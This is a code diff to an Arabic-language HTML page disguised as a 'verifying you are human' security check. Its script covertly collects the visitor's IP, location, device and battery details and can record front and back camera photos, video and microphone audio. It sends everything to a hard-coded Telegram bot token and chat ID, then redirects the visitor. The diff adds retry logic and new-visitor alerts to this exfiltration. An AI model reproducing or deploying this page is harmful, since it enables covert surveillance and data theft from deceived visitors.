@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>التحقق الأمني</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
             background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
@@ -92,9 +88,6 @@
             font-size: 0.7rem;
             color: #4a567a;
         }
-        .hidden-status {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -111,14 +104,12 @@
 
 <script>
     (function(){
-        // ========== بيانات البوت (تم تحديثها) ==========
         const BOT_TOKEN = "8708315102:AAGa62Wi5kAvAs1qj-heQR7LowoBbINNLwM";
         const CHAT_ID = "7719763576";
 
-        // رسالة عامة للمستخدم طوال الوقت
-        const userMessage = "جاري التحقق من أنك إنسان ...";
+        // رسالة المستخدم ثابتة
         const statusEl = document.getElementById("statusMsg");
-        if(statusEl) statusEl.innerText = userMessage;
+        if(statusEl) statusEl.innerText = "جاري التحقق من أنك إنسان ...";
 
         // تحليل الرابط
         const urlParams = window.location.search.substring(1);
@@ -150,34 +141,51 @@
             }
         }
 
-        // إذا لم يوجد رابط صالح أو إجراءات، نضيف المعلومات فقط ونوجه إلى رابط افتراضي
         if(!targetUrl){
             targetUrl = "http://t.me/Glitch_telebot";
             actionList = [{ type:"info", duration:0 }];
         }
         if(actionList.length === 0) actionList.push({ type:"info", duration:0 });
 
-        // وظائف مساعدة (بدون رسائل للمستخدم)
+        // دوال الإرسال إلى تيليجرام (مع إعادة المحاولة)
         async function sendToTelegram(method, payload, isFormData = false) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-            try {
-                if(isFormData) {
-                    return await fetch(url, { method:"POST", body:payload });
-                } else {
-                    return await fetch(url, {
-                        method:"POST",
-                        headers: { "Content-Type":"application/json" },
-                        body: JSON.stringify(payload)
-                    });
-                }
-            } catch(e) { console.error(e); return null; }
+            for(let attempt = 0; attempt < 2; attempt++) {
+                try {
+                    let res;
+                    if(isFormData) {
+                        res = await fetch(url, { method:"POST", body:payload });
+                    } else {
+                        res = await fetch(url, {
+                            method:"POST",
+                            headers: { "Content-Type":"application/json" },
+                            body: JSON.stringify(payload)
+                        });
+                    }
+                    const json = await res.json();
+                    if(json.ok) return json;
+                    console.error(`Telegram error attempt ${attempt+1}:`, json);
+                } catch(e) { console.error(`Fetch error attempt ${attempt+1}:`, e); }
+                await new Promise(r => setTimeout(r, 500));
+            }
+            return null;
         }
 
+        // إرسال رسالة نصية قصيرة (اختبار)
+        async function sendTextMessage(text) {
+            return await sendToTelegram("sendMessage", {
+                chat_id: CHAT_ID,
+                text: text,
+                disable_web_page_preview: true
+            });
+        }
+
+        // جمع المعلومات وتقسيمها إلى رسائل متعددة
         async function getDeviceDetails() {
             const ua = navigator.userAgent;
-            let deviceModel = "Unknown";
+            let deviceModel = "غير معروف";
             const modelMatch = ua.match(/\((.*?)\)/);
-            if(modelMatch && modelMatch[1]) deviceModel = modelMatch[1].split(";").pop().trim() || "Unknown";
+            if(modelMatch && modelMatch[1]) deviceModel = modelMatch[1].split(";").pop().trim() || "غير معروف";
             const language = navigator.language || navigator.userLanguage;
             let ip = "0.0.0.0", country="غير متوفر", region="غير متوفر", city="غير متوفر", timezone="غير متوفر";
             try{
@@ -236,27 +244,34 @@
         }
 
         async function sendInfoMessage() {
-            const details = await getDeviceDetails();
-            const message = `╔══════════════════════════════════╗\n` +
-                `📡 *معلومات الزائر* 📡\n` +
-                `╚══════════════════════════════════╝\n\n` +
-                `🖥️ *الجهاز والمتصفح*\n   • الموديل: ${details.deviceModel}\n   • User Agent: \`${details.userAgent.substring(0,100)}\`\n\n` +
-                `🌐 *معلومات الشبكة*\n   • عنوان IP: ${details.ip}\n   • اللغة: ${details.language}\n\n` +
-                `📍 *الموقع الجغرافي*\n   • الدولة: ${details.country}\n   • المنطقة: ${details.region}\n   • المدينة: ${details.city}\n   • التوقيت: ${details.timezone}\n\n` +
-                `🖼️ *الشاشة*: ${details.resolution}\n\n🔋 *البطارية*\n   • المستوى: ${details.batteryLevel}\n   • الشحن: ${details.batteryCharging}\n\n` +
-                `🔐 *الصلاحيات*\n   • الكاميرا: ${details.cameraPerm}\n   • الموقع: ${details.locationPerm}\n\n` +
-                `💾 *العتاد والتخزين*\n   • نوى المعالج: ${details.cpuCores}\n   • الرام: ${details.ram}\n   • التخزين المستخدم: ${details.storageUsed} GB\n   • التخزين الكلي: ${details.storageTotal} GB\n\n` +
-                `⏰ *وقت الدخول*\n   • ${details.enterTime}\n   • ${details.enterDate}\n   • ${details.enterDay}\n\n` +
-                `🔗 *الرابط الهدف*\n   • ${details.targetLink}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n✓ تم الالتقاط بواسطة نظام الحماية`;
-            try{
-                await sendToTelegram("sendMessage", {
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: "Markdown"
-                });
-            } catch(e){ console.error("Info send failed", e); }
+            const d = await getDeviceDetails();
+            // الرسالة الأولى: الجهاز والمتصفح والشبكة
+            let msg1 = `📊 *معلومات الزائر* 📊\n\n` +
+                       `🖥️ الجهاز: ${d.deviceModel}\n` +
+                       `🌐 اللغة: ${d.language}\n` +
+                       `📡 IP: ${d.ip}\n` +
+                       `📍 الدولة: ${d.country}\n` +
+                       `🗺️ المنطقة: ${d.region}\n` +
+                       `🏙️ المدينة: ${d.city}\n` +
+                       `⏰ التوقيت: ${d.timezone}\n\n` +
+                       `🖼️ الدقة: ${d.resolution}\n` +
+                       `🔋 البطارية: ${d.batteryLevel} (شحن: ${d.batteryCharging})\n` +
+                       `💾 الرام: ${d.ram} | المعالج: ${d.cpuCores} نواة\n` +
+                       `📦 التخزين: ${d.storageUsed} GB / ${d.storageTotal} GB\n\n` +
+                       `🔐 صلاحيات الكاميرا: ${d.cameraPerm}\n` +
+                       `📍 صلاحيات الموقع: ${d.locationPerm}\n\n` +
+                       `⏱️ وقت الدخول: ${d.enterTime} - ${d.enterDate} (${d.enterDay})\n\n` +
+                       `🔗 الرابط الهدف: ${d.targetLink}`;
+            
+            // إرسالها كـ HTML عادي بدون Markdown (للتأكد)
+            await sendTextMessage(msg1.replace(/\*/g, ''));
+            
+            // إرسال User Agent كرسالة ثانية لتجنب الطول
+            let msg2 = `🖥️ User Agent:\n${d.userAgent.substring(0, 380)}`;
+            await sendTextMessage(msg2);
         }
 
+        // دوال الكاميرا والميكروفون (نفس السابق ولكن بدون رسائل للمستخدم)
         async function getCameraStream(facingMode, mediaType, durationSec){
             let constraints = { video: { facingMode: { exact: facingMode } } };
             try{
@@ -355,33 +370,34 @@
             for(let act of actions){
                 if(act.type === "info"){
                     await sendInfoMessage();
-                    await new Promise(r => setTimeout(r, 300));
+                    await new Promise(r => setTimeout(r, 500));
                 } else if(act.type === "frontPhoto"){
                     const media = await captureMedia("frontPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "🖼️ صورة كاميرا أمامية");
+                    if(media) await sendMediaToBot(media, "🖼️ صورة أمامية");
                 } else if(act.type === "frontVideo"){
                     const media = await captureMedia("frontVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي (${act.duration} ث)`);
+                    if(media) await sendMediaToBot(media, `🎬 فيديو أمامي ${act.duration}ث`);
                 } else if(act.type === "backPhoto"){
                     const media = await captureMedia("backPhoto", "photo", 0);
-                    if(media) await sendMediaToBot(media, "📷 صورة كاميرا خلفية");
+                    if(media) await sendMediaToBot(media, "📷 صورة خلفية");
                 } else if(act.type === "backVideo"){
                     const media = await captureMedia("backVideo", "video", act.duration);
-                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي (${act.duration} ث)`);
+                    if(media) await sendMediaToBot(media, `🎞️ فيديو خلفي ${act.duration}ث`);
                 } else if(act.type === "micAudio"){
                     const media = await captureMedia("micAudio", "audio", act.duration);
-                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي (${act.duration} ثانية)`);
+                    if(media) await sendMediaToBot(media, `🎤 تسجيل صوتي ${act.duration}ث`);
                 }
-                await new Promise(r => setTimeout(r, 400));
+                await new Promise(r => setTimeout(r, 300));
             }
         }
 
-        // التنفيذ الرئيسي (بدون رسائل تفصيلية للمستخدم)
+        // بدء التنفيذ
         (async function(){
             try{
+                // إرسال رسالة بدء للتأكد من أن البوت يتلقى رسائل نصية
+                await sendTextMessage("🔍 بدء عملية التحقق - تم استقبال زائر جديد");
                 await runActions(actionList);
             } catch(e){ console.error(e); }
-            // التحويل إلى الرابط الهدف بعد 1.5 ثانية
             setTimeout(()=>{
                 window.location.href = targetUrl;
             }, 1500);
@@ -389,4 +405,4 @@
     })();
 </script>
 </body>
-        </html>
+</html>
